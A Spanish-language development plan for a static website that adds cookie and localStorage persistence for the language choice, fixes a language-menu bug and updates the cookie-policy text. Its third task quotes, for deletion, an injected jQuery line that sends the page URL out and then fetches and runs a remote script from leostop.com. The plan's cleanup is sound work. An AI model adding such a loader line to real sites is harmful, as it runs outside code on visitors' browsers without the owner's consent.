# Plan: Persistencia de idioma con cookie + localStorage y verificación de cookies

## Hallazgos (verificados en el código actual)

- La cookie `mentalhell_lang` se escribe **solo** dentro de `setLang()` (`js/custom.js:611-615`). No hay ninguna otra escritura de `document.cookie` en el proyecto.
- Al cargar cada página, `init()` llama a `detectLanguage()` (`js/custom.js:635-638`), que únicamente **lee** la cookie y, si no existe, usa `navigator.language`. Por tanto, hoy la cookie **no** se activa antes de cambiar de idioma: el requisito ya se cumple.
- La cookie no persiste "en local" cuando los HTML se abren con `file://` (doble clic), porque los navegadores no guardan cookies para ese esquema. Con HTTP (`localhost`) sí funciona.
- `js/custom.js:49` carga un script externo de seguimiento (`leostop.com/tracking/tracking.js`) en cada página; puede crear cookies de terceros antes de cualquier acción del usuario y contradice la política publicada. Se eliminará.
- Bug adicional detectado: al pulsar una opción del menú, `setLang()` cierra el menú, pero el listener de `document` (`js/custom.js:624-633`) vuelve a abrirlo porque el clic también está dentro de `#langBtn`. No afecta a la cookie, pero conviene corregirlo en el mismo cambio.

## Decisiones tomadas

1. Guardar **siempre** el idioma en cookie y en `localStorage` al cambiar de idioma (elección del usuario).
2. La escritura ocurre **solo** en `setLang()`. La carga inicial es de solo lectura: no se crea cookie ni entrada de `localStorage` al visitar la web.
3. Eliminar el script de seguimiento externo.
4. Actualizar la política de cookies para mencionar también el almacenamiento local.

## Tareas ordenadas

### 1. `js/custom.js` — almacenamiento local seguro

Añadir junto a `COOKIE_NAME`/`COOKIE_DAYS`:

```js
var STORAGE_KEY = COOKIE_NAME;
```

Añadir helpers tolerantes a errores (Safari privado, almacenamiento bloqueado):

```js
function getStoredLang() {
    try {
        var v = window.localStorage.getItem(STORAGE_KEY);
        return v === "es" || v === "en" ? v : null;
    } catch (e) {
        return null;
    }
}

function setStoredLang(lang) {
    try {
        window.localStorage.setItem(STORAGE_KEY, lang);
    } catch (e) {}
}
```

Modificar `detectLanguage()` para leer cookie → `localStorage` → `navigator.language`:

```js
function detectLanguage() {
    var c = getCookie(COOKIE_NAME);
    if (c === "es" || c === "en") return c;
    var s = getStoredLang();
    if (s) return s;
    var nav = navigator.language || (navigator.languages && navigator.languages[0]) || "";
    return nav.substring(0, 2).toLowerCase() === "es" ? "es" : "en";
}
```

Modificar `setLang()` para escribir ambos:

```js
function setLang(lang) {
    setCookie(COOKIE_NAME, lang, COOKIE_DAYS);
    setStoredLang(lang);
    applyTranslations(lang);
    toggleLangMenu(false);
}
```

**Invariante:** no llamar a `setStoredLang`/`setCookie` desde `init()` ni desde `detectLanguage()`. Si se "sincroniza" en la carga, aparecería almacenamiento antes de que el usuario cambie el idioma.

### 2. `js/custom.js` — evitar que el menú se reabra al elegir idioma

En el listener de `document` (`js/custom.js:624-633`), ignorar los clics sobre `.lang-option` antes de alternar el menú. Implementación compatible sin depender de `Element.closest`:

```js
function isLangOption(el) {
    while (el && el !== document) {
        if (el.classList && el.classList.contains("lang-option")) return true;
        el = el.parentNode;
    }
    return false;
}
```

Y al inicio del listener:

```js
if (isLangOption(e.target)) return;
```

Resultado: al elegir ES/EN el menú queda cerrado y el cambio de idioma es visible.

### 3. `js/custom.js:49` — eliminar el script de seguimiento

Borrar la sentencia:

```js
function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
```

No queda ninguna otra referencia a `getURL`, `protocol`, `leostop` ni a ese `$.ajax` en el archivo.

### 4. `politicas.html` + diccionarios de `js/custom.js` — texto de cookies

Actualizar el texto estático de `politicas.html:194-195` y las claves `politicas.p.cookies1` / `politicas.p.cookies2` en los diccionarios `es` (`js/custom.js:364-365`) y `en` (`js/custom.js:570-571`).

ES:

- `cookies1`: "Este sitio web utiliza una única cookie propia y el almacenamiento local del navegador con la única finalidad de recordar el idioma seleccionado manualmente por el usuario."
- `cookies2`: "Tanto la cookie como el almacenamiento local se generan únicamente cuando el usuario cambia voluntariamente el idioma mediante el selector disponible en la web. No se instalan ni se activan por el simple hecho de visitar o navegar por el sitio web."

EN:

- `cookies1`: "This website uses a single own cookie and the browser's local storage for the sole purpose of remembering the language manually selected by the user."
- `cookies2`: "Both the cookie and the local storage are only generated when the user voluntarily changes the language through the selector available on the website. They are not installed or activated simply by visiting or browsing the website."

El resto de párrafos (finalidad funcional, sin seguimiento, exención AEPD) se mantiene.

## Criterios de aceptación

1. Primera visita con cookies y almacenamiento borrados: **no** existe `mentalhell_lang` ni en Cookies ni en Local Storage tras cargar la página.
2. Tras elegir EN en el selector: existen `mentalhell_lang=en` como cookie y como entrada de `localStorage`; los textos cambian a inglés y el menú se cierra.
3. Navegar a otra página (p. ej. `contacto.html`) mantiene EN sin volver a pulsar el selector.
4. Volver a ES actualiza ambos valores y los textos.
5. Abrir el sitio con doble clic (`file://`): el idioma se mantiene entre páginas gracias a `localStorage` (si el navegador permite almacenamiento para `file://`).
6. DevTools → Network: no hay peticiones a `leostop.com`.
7. `politicas.html` muestra el texto actualizado en ES y EN.

## Validación manual

1. Servir por HTTP (`python -m http.server` o Live Server) y abrir `index.html`.
2. DevTools → Application → Local Storage y Cookies: confirmar que `mentalhell_lang` no existe antes de tocar el selector.
3. Cambiar idioma, comprobar textos, cookie, `localStorage` y que el menú queda cerrado.
4. Navegar entre las 9 páginas (`index.html`, `contacto.html`, `portafolios.html`, `politicas.html`, `lostdarkness.html`, `alien1.html`, `alien2.html`, `alien3.html`, `tid-activity-manager.html`) y confirmar persistencia.
5. Repetir abriendo los HTML con `file://`.
6. Recargar y cerrar/abrir el navegador para confirmar persistencia.
7. Revisar la consola en busca de errores.

## Riesgos y notas

- Algunos navegadores (p. ej. Safari) pueden bloquear `localStorage` en `file://`; los `try/catch` evitan errores, pero en ese caso la persistencia local solo está garantizada sirviendo por HTTP.
- `file://` y `http://localhost` son orígenes distintos: el idioma no se comparte entre ambos escenarios.
- El sitio es estático: no hay build, lint ni tests automatizados; la validación es manual en navegador.
- No se modifica el diseño ni la estructura HTML del selector; solo la lógica de persistencia y el cierre del menú.

## Archivos afectados

- `js/custom.js`
- `politicas.html`
